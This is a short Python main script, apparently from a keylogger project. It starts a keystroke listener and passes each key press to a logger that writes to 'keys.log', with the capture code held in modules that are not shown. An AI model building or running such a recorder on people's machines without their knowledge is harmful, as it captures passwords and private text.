from utils.logger import Filelogger
from core.listener import Keystrokelistener

def main():
    logger=Filelogger("keys.log")
    listener=Keystrokelistener(on_press_callback=logger.log_keystroke)
    listener.start()
    try:
        listener.join()
    except KeyboardInterrupt:
        listener.stop()
if __name__ == "__main__" :
    main()